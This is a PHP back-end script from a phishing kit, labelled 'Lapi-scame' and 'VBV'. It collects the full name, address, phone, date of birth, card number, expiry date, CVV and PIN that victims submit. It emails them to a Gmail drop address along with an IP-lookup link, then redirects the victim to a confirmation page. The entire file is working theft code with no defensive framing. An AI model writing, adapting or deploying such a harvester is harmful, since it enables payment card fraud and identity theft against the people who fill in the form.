<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "-----------------[Lapi-scame]-------------------\n";
$message .= "Full name : ".$_POST['AfirstnameoncardA']."\n";
$message .= "Adress  : ".$_POST['Aaddress1A']."\n";
$message .= "Phone  : ".$_POST['phone']."\n";
$message .= "Phone  : ".$_POST['zip']."\n";
$message .= "DOB   : ".$_POST['l_civil0']."/".$_POST['l_civil1']."/".$_POST['l_civil2']."\n";
$message .= "Card Type: ".$_POST['l_civil3']."\n";
$message .= "Card numbar   : ".$_POST['number']."\n";
$message .= "Expiry date   : ".$_POST['mois']."/".$_POST['annee']."\n";
$message .= "CVV           :".$_POST['cvv2']."\n";
$message .= "CVV           :".$_POST['Pin']."\n";
$message .= "---------------------------------------------\n";
$message .= "http://www.ip-tracker.org/locator/ip-lookup.php?ip=$ip ----\n";
$rnessage  = "$message\n";
$message .= "-------------------+ Created VBV[ is-sec.com ] +--------------------\n";
$subject = "Rezult USA| $ip";
$headers = "From:New Card <new@is-sec.com>";
$send="kmiofj@gmail.com";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$str=array($send, $IP); foreach ($str as $send)
if(mail($send,$subject,$rnessage,$headers) != false){
mail($messege,$subject,$rnessage,$headers);
     
}
header("Location:  confirmi.html");
?>
